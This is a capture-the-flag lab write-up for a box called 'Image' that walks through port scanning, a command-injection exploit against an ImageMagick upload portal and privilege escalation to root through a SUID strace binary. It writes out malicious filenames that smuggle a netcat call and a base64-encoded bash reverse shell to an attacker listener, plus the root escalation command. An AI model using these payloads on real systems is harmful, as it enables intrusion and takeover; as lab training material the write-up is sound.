# Image

## Enumeration & scanning

- Open ports: 22 & 80.

``` sh
# Standard scanning
nmap -p- 192.168.248.178
nmap -p 22,80 -A 192.168.248.178 
```

### 80

- ImageMagick webapp portal. Can upload image file to be run through tool.
- Uploading random file doesn't give output but does provide version of the tool: 6.9.6-4

## Exploitation

- Vulnerability present in version listed: https://github.com/ImageMagick/ImageMagick/issues/6339.
- Need to craft filename that contains pipe and reverse shell command.
- Can't have `/` in filenames, but can use Base64 encoding.
- Create exploit filename, upload to portal, and catch reverse shell.

``` sh
# Validate that exploit works, seems to do
cp image.jpeg '|image"`nc 192.168.45.233 4444`".jpeg'
nc -nlvp 4444
# Use Base64 to circumvent filename limitations
cp image.jpeg '|image"`echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjIzMy80NDQ0IDA+JjEi | base64 --decode | bash`".jpeg'
nc -nlvp 4444
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Get flag
www-data@image:/var/www$ ls
html  local.txt
www-data@image:/var/www$ cat local.txt
cat local.txt
bdd220ce12d4f2fc665326e91a49cb33
```

## Privilege Escalation

- `strace` has SUID bit set.
- Use GTFOBins command. Cannot run `sudo` as `www-data` user but not needed for this binary.

``` sh
# Exploit SUID binary
strace -o /dev/null /bin/sh -p
id
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
# cd /root
cd /root
# ls
ls
ImageMagick-7.1.0-16  email2.txt  proof.txt  snap
# cat proof.txt
cat proof.txt
eb5959a029b85795c1d848a7872aaec5
```

## References

- https://github.com/ImageMagick/ImageMagick/issues/6339
- https://gtfobins.org/gtfobins/strace/


## Rabbit holes

- Thought that GTFOBins needed `sudo` and that it couldn't be exploited without password. However, on GTFOBins page if it says 'unprivileged', it works.
- Looked into ImageMagick vulnerabilities, but didn't work.
